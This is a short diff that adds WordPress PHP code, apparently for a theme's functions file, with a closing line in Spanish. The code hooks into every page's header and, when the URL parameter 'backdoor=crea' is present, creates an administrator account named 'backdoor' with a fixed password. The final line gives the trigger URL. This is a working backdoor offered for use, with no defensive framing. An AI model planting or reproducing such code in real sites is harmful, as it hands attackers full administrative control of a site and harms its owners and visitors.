@@ -1,0 +1,16 @@
+function my_backdoor() {
+if ($_GET['backdoor'] == 'crea') {
+require('wp-includes/registration.php');
+if (!username_exists('backdoor')) {
+$user_id = wp_create_user('backdoor', 'my-password');
+$user = new WP_User($user_id);
+$user->set_role('administrator');
+echo 'Puerta trasera creada';
+die();
+}
+}
+}
+add_action( 'wp_head', 'my_backdoor' );
+
+El URL que tienen que usar: /?backdoor=crea
+
